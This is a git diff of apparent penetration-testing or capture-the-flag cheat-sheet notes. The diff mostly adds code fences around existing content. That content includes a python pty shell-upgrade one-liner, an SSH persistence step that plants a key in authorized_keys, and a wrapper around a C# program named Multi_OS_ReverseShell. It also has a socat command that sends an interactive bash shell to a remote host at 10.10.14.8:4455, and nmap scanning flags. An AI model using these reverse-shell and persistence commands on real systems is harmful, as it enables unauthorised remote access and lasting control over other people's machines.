@@ -25,7 +25,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ssh persistence -> id_rsa.pub into 	~/.ssh/authorized_keys
 
-
+```csharp
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -169,17 +169,15 @@ namespace Multi_OS_ReverseShell
         }
     }
 }
+```
 
+<https://stackoverflow.com/questions/9059026/php-check-if-file-contains-a-string>
 
-
-
-
-
-
-https://stackoverflow.com/questions/9059026/php-check-if-file-contains-a-string
-
-
-
-
+```bash
 socat file:$(tty),raw,echo=0 tcp-listen:4455
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:4455
+```
+
+nmap
+-sC common scripts
+-p- all ports
